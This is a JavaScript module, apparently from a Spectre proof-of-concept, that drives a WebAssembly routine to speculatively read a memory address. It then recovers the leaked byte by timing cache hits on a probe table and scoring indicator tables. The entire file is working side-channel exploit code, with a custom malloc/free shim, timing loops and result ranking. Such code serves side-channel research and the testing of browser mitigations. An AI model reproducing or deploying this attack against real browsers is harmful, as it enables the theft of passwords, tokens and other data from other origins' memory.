import {mean, zIndex} from "../helper/math.js";
import timer_promise from "../timer.js";
import code_buffer from "../wasm-buffer.js";
import indicator_table_promise from "../indicator-table.js";

let junk = 0;

export default
(async () => {
    let _probeTable;
    
    const IndicatorTable = await indicator_table_promise;
    const timer = await timer_promise;
    
    let secret_table;
    const {instance} = await WebAssembly.instantiate(code_buffer, {
        env: {
            // _Z10startTimerv: timer.restore,
            // _Z9stopTimerv: timer.load,
            probeTable(probe_table_address) {
                _probeTable(probe_table_address);
            },
            _log(argument) {
              console.log("log", argument);
            },
            malloc(size) {
                // console.log("malloc request", size);
                const need = current_memory_position + size - wasm_memory.buffer.byteLength;
                if (need > 0) {
                    // console.log("malloc needs", Math.ceil(need / (1 << 16)), "pages");
                    try {
                        wasm_memory.grow(Math.ceil(need / (1 << 16)));
                        secret_table = new Uint8Array(wasm_memory.buffer, instance.exports.getSecretTableAddress(), 4 << 12);
                    } catch (error) {
                        // reached alloc limit -> reuse memory
                        // console.log(wasm_memory.buffer.byteLength);
                        current_memory_position = (4 << 12) * 2;
                    }
                }
                try {
                    // console.log("malloc response", current_memory_position);
                    return current_memory_position;
                } finally {
                    current_memory_position += size;
                }
            },
            // mutilated free only works on last malloced
            free(pointer) {
                if (pointer > current_memory_position) {
                    throw RuntimeError("invalid free address");
                }
                current_memory_position = pointer;
            }
        }
    });
    const wasm_memory = instance.exports.memory;
    let current_memory_position = wasm_memory.buffer.byteLength;

    instance.exports.initialize();
    // globalThis.secret_table = secret_table;
    const _speculativelyReadAddress = instance.exports.speculativelyReadAddress;

    return {
        get secret_table() {
            return secret_table
        },
        speculativelyReadMemory
    };
    
    function speculativelyReadMemory(address, speculative_repetitions, min_iterations, max_cache_hit_number, page_size, probe_length) {
        _probeTable = probeTable;
        const time_tables = [];
        let max_indicator;
        let max_indicator_index;
        const mean_times = [];
        const indicator_table = new IndicatorTable(probe_length);
        
        let i = 0;
        let total_iterations = 0;
        for (; i < min_iterations; ++total_iterations) {
            _speculativelyReadAddress(address, speculative_repetitions, page_size, probe_length);
            // process time tables
            let high_mean_time;
            for (const time_table of time_tables) {
                const mean_time = indicator_table.processTimetable(time_table, max_cache_hit_number);
                // lower limit check is done by indicator_table
                if (mean_time) {
                    mean_times.push(mean_time);
                    high_mean_time = true;
                } else {
                    // console.warn("slow timer");
                    continue;
                }
                // console.log(`%cprobe index time ${time_table[probe_index]}`, "font-size: .9em");
                max_indicator = Math.max(...indicator_table);
                let current_max_indicator_index = indicator_table.indexOf(max_indicator);
                // check for multiple maxima
                for (let i = current_max_indicator_index + 1; i < indicator_table.length; ++i) {
                    if (max_indicator == indicator_table[i]) {
                        current_max_indicator_index = undefined;
                        break;
                    }
                }
                // max_indicator_index changed
                if (max_indicator_index != current_max_indicator_index) {
                    i = (current_max_indicator_index !== undefined) | 0;
                    max_indicator_index = current_max_indicator_index;
                    // console.warn("max_indicator_index changed");
                } else {
                    ++i;
                }
            }
            if (total_iterations > min_iterations && !high_mean_time) {
                break;
            }

            time_tables.length = 0;
        }
        const mean_time = mean(mean_times);
        if (i < min_iterations) {
            max_indicator_index = undefined;
            // console.warn("index test failed");
        }
        // prepare results
        let second_indicator = -Infinity;
        for (let i = 0; i < indicator_table.length; ++i) {
            const indicator = indicator_table[i];
            if (indicator > second_indicator && i != max_indicator_index) {
                second_indicator = indicator;
            }
        }
        const second_ratio = second_indicator / max_indicator;
        // console.log("second ratio", second_ratio);
        return {
            max_indicator_index,
            second_ratio,
            // normalized_indicator_table: indicator_table.getNormalized(),
            mean_time,
            total_iterations
        };
    
        function probeTable(probe_table_address) {
            instance;
            const time_table = new Uint32Array(probe_length);
            // const probe_table = new Uint8Array(probe_length * page_size);
            const probe_table = new Uint8Array(wasm_memory.buffer, probe_table_address, probe_length * page_size);
            const random_offset = Math.random() * 256 | 0;
            // console.log("random offset", random_offset);
            // probe table
            for (let i = 0; i < probe_length; ++i) {
                timer.restore();
                junk ^= probe_table[(i + random_offset) % 256 * page_size];
                time_table[(i + random_offset) % 256] = timer.load();
            }
            time_tables.push(time_table);
        }
    }
})();